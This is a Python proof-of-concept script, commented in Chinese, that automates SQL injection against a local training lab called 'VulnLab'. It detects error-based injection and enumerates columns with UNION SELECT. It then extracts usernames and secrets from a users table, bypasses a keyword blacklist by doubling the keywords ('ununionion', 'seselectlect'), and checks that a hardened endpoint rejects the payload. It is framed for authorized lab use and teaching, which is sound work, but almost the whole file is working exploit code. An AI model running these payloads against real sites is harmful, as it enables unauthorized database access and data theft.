#!/usr/bin/env python3
"""VulnLab SQL 注入自动验证脚本（零第三方依赖）。

这个脚本和 `pocs/*.yaml` 是同一个漏洞的两种表达：

- YAML PoC：声明式，交给扫描器引擎批量执行，适合规模化
- 本脚本：命令式，展示**完整推导过程**，适合学习与调试

为什么坚持只用标准库？
    演示脚本最大的价值是「任何人 clone 下来直接能跑」。
    一旦引入 requests，就多了装依赖这一步，很多人会在这里放弃。
    urllib 够用，且顺便证明你理解 HTTP 协议本身而不只是会调库。

用法:
    python poc_sqli.py                          # 默认测 http://127.0.0.1:8080
    python poc_sqli.py --url http://target:8080
    python poc_sqli.py --url http://x --json    # 输出 JSON

⚠️ 仅用于本地 / 授权环境。
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

TIMEOUT = 10


# --------------------------------------------------------------------- HTTP


def http_get(url: str, timeout: float = TIMEOUT) -> tuple[int, str]:
    """发一个 GET 请求，返回 ``(状态码, 响应正文)``。

    刻意不使用 ``urlopen(url)`` 直接读，而是分开处理异常：
    404 与「连接失败」在注入检测里含义完全不同 ——
    前者说明路径不存在（可能是靶场没跑起来），后者说明网络问题。
    """
    request = urllib.request.Request(
        url,
        headers={
            "User-Agent": "VulnLab-PoC/1.0 (authorized-lab-only)",
            "Accept": "*/*",
        },
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            body = response.read().decode("utf-8", errors="ignore")
            return response.status, body
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", errors="ignore")
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return 0, f"__CONNECTION_ERROR__: {exc}"


def build_url(base: str, path: str, params: dict[str, str] | None = None) -> str:
    """拼接带查询参数的 URL（正确做百分号编码）。"""
    url = f"{base.rstrip('/')}{path}"
    if params:
        url = f"{url}?{urllib.parse.urlencode(params)}"
    return url


# ------------------------------------------------------------------ 结果


@dataclass
class Finding:
    """一条检测结论。"""

    name: str
    vulnerable: bool
    detail: str = ""
    evidence: str = ""
    payload: str = ""
    extracted: dict[str, str] = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "vulnerable": self.vulnerable,
            "detail": self.detail,
            "evidence": self.evidence,
            "payload": self.payload,
            "extracted": self.extracted,
        }


SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

#: 数据库报错页的特征。用于排除「payload 出现在错误信息里」造成的误报，
#: 详见 detect_columns 里的说明。
_DB_ERROR_PATTERN = re.compile(
    r"SQLSTATE\[|syntax error|unrecognized token|PDOException|数据库错误",
    re.IGNORECASE,
)


def looks_like_db_error(body: str) -> bool:
    """判断响应正文是否是数据库错误页。"""
    return bool(_DB_ERROR_PATTERN.search(body))


# ------------------------------------------------------------------ 检测项


def check_alive(base: str) -> tuple[bool, str]:
    """先探活 —— 靶场可能根本没启动。先确认再断言。"""
    status, _ = http_get(build_url(base, "/index.php"))
    if status == 0:
        return False, f"无法连接 {base}。请先启动靶场（start.bat / start.sh），或用 --url 指定正确地址。"
    if status != 200:
        return False, f"{base}/index.php 返回 HTTP {status}，靶场可能未正常启动。"
    return True, "靶场可达"


def check_error_based(base: str, level: str) -> Finding:
    """报错型注入检测：注入孤立单引号，看是否回显数据库错误。"""
    payload = "1'"
    url = build_url(base, f"/sqli/{level}.php", {"id": payload})
    status, body = http_get(url)

    patterns = [
        r"SQLSTATE\[",
        r"syntax error",
        r"unrecognized token",
        r"PDOException",
        r"数据库错误",
    ]
    hit = ""
    for pattern in patterns:
        found = re.search(pattern, body, re.IGNORECASE)
        if found:
            hit = found.group(0)
            break

    return Finding(
        name=f"报错型检测（{level} 档）",
        vulnerable=bool(hit) and status == 200,
        detail=f"HTTP {status}；" + ("响应中回显了数据库错误信息" if hit else "未发现报错回显"),
        evidence=hit,
        payload=payload,
    )


def detect_columns(base: str, level: str, max_columns: int = 10) -> Finding:
    """用 UNION SELECT 递增值探测列数。

    原理：UNION 两侧列数必须一致，不一致会报错。
    找到第一个不报错的 n，就是列数。

    ⚠️ 踩过的坑：最初这里只判断 `marker in body`，
    结果在 1 列时就报「命中」—— 因为数据库的报错信息里
    **会把出错的语句原文回显出来**，而我们自己的 payload（含 marker）
    正好就在那段原文里。

    这正是注入检测里最典型的误报来源：**检测特征被检测行为本身「制造」了出来**。
    解法是先确认响应不是错误页，再判断标记：
        if marker in body and not looks_like_db_error(body): ...
    这个思路在 YAML PoC 里对应 `negative: true` 的反向匹配器。
    """
    marker = "VULNLAB_COLMARK"
    for columns in range(1, max_columns + 1):
        # 每一列都填标记串，无论哪一列回显都能看到
        projection = ",".join([f"'{marker}'"] * columns)
        payload = f"-1 UNION SELECT {projection}"
        url = build_url(base, f"/sqli/{level}.php", {"id": payload})
        status, body = http_get(url)

        if status == 200 and marker in body and not looks_like_db_error(body):
            return Finding(
                name=f"列数探测（{level} 档）",
                vulnerable=True,
                detail=f"确定原查询为 {columns} 列（UNION SELECT 注入成功）",
                evidence=marker,
                payload=payload,
            )

    return Finding(
        name=f"列数探测（{level} 档）",
        vulnerable=False,
        detail=f"在 1~{max_columns} 列范围内未找到可用的 UNION 注入",
    )


def exploit_union_low(base: str) -> Finding:
    """low 档：数字型 UNION 注入，直接拖出 secret。"""
    payload = "-1 UNION SELECT 1,username,secret,role FROM users"
    url = build_url(base, "/sqli/low.php", {"id": payload})
    status, body = http_get(url)

    secret = ""
    match = re.search(r"VULNLAB\{[^}]+\}", body)
    if match:
        secret = match.group(0)

    return Finding(
        name="low 档 · UNION 注入拖库",
        vulnerable=bool(secret),
        detail="成功注入并读取到 secret 字段" if secret else "未能读到 secret",
        evidence=secret,
        payload=payload,
        extracted={"secret": secret} if secret else {},
    )


def exploit_medium_bypass(base: str) -> Finding:
    """medium 档：黑名单双写绕过。

    `str_ireplace` 是单次非递归替换，所以 "ununionion" 删掉中间的 "union"
    之后，剩下的 "un" + "ion" 正好拼回 "union"。
    """
    payload = "1' ununionion seselectlect 1,username,secret,role frfromom users-- "
    url = build_url(base, "/sqli/medium.php", {"id": payload})
    status, body = http_get(url)

    secret = ""
    match = re.search(r"VULNLAB\{[^}]+\}", body)
    if match:
        secret = match.group(0)

    return Finding(
        name="medium 档 · 黑名单双写绕过",
        vulnerable=bool(secret),
        detail=(
            "双写绕过成功：ununionion→union, seselectlect→select, frfromom→from"
            if secret
            else "绕过失败，过滤可能不是单次替换或黑名单不同"
        ),
        evidence=secret,
        payload=payload,
        extracted={"secret": secret} if secret else {},
    )


def check_high_neutralized(base: str) -> Finding:
    """high 档：验证修复是否生效 —— 同样的 payload 应该打不动。"""
    payload = "-1 UNION SELECT 1,username,secret,role FROM users"
    url = build_url(base, "/sqli/high.php", {"id": payload})
    status, body = http_get(url)

    leaked = bool(re.search(r"VULNLAB\{[^}]+\}", body))
    rejected = "输入被拒绝" in body or "必须是纯数字" in body

    # 注意这里的逻辑反转：high 档「测不到漏洞」才是正确结果
    return Finding(
        name="high 档 · 修复有效性验证",
        vulnerable=False,
        detail=(
            "修复生效：请求在类型校验阶段就被拒绝，未到达数据库"
            if rejected and not leaked
            else ("⚠️ 修复失效：居然读到了 secret！" if leaked else "未见明确的拒绝提示")
        ),
        evidence="类型校验拒绝" if rejected else "",
        payload=payload,
    )


# ------------------------------------------------------------------ 主流程


def run_checks(base: str) -> list[Finding]:
    """执行全部检测项。"""
    findings: list[Finding] = []

    alive, message = check_alive(base)
    if not alive:
        print(f"[!] {message}", file=sys.stderr)
        return []

    findings.append(check_error_based(base, "low"))
    findings.append(detect_columns(base, "low"))
    findings.append(exploit_union_low(base))
    findings.append(check_error_based(base, "medium"))
    findings.append(exploit_medium_bypass(base))
    findings.append(check_high_neutralized(base))

    return findings


def print_report(base: str, findings: list[Finding]) -> None:
    """打印人类可读报告。"""
    print()
    print("=" * 74)
    print(f"  VulnLab SQL 注入验证报告")
    print(f"  目标: {base}")
    print("=" * 74)
    print()

    width = 34
    for finding in findings:
        if finding.name.startswith("high 档"):
            mark = "[✓ 修复]" if "修复生效" in finding.detail else "[✗ 异常]"
        else:
            mark = "[命中]" if finding.vulnerable else "[未命中]"

        print(f"{mark} {finding.name.ljust(width)}")
        print(f"        {finding.detail}")
        if finding.payload:
            print(f"        payload: {finding.payload}")
        if finding.evidence:
            print(f"        证据:    {finding.evidence}")
        print()

    # 汇总
    hits = [f for f in findings if f.vulnerable]
    secrets = set()
    for finding in findings:
        if "secret" in finding.extracted:
            secrets.add(finding.extracted["secret"])

    print("-" * 74)
    print(f"命中项: {len(hits)} / {len(findings)}")
    if secrets:
        print(f"提取到通关凭证: {', '.join(sorted(secrets))}")
    print("-" * 74)
    print()


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="VulnLab SQL 注入自动验证脚本（仅用于授权环境）",
    )
    parser.add_argument(
        "--url", default="http://127.0.0.1:8080", help="靶场地址（默认 http://127.0.0.1:8080）"
    )
    parser.add_argument("--json", action="store_true", help="以 JSON 格式输出")
    args = parser.parse_args(argv)

    findings = run_checks(args.url)

    if not findings:
        return 2

    if args.json:
        print(
            json.dumps(
                {"target": args.url, "findings": [f.to_dict() for f in findings]},
                ensure_ascii=False,
                indent=2,
            )
        )
    else:
        print_report(args.url, findings)

    # 退出码约定：有命中返回 1，便于在 CI 里判断
    return 1 if any(f.vulnerable for f in findings) else 0


if __name__ == "__main__":
    raise SystemExit(main())
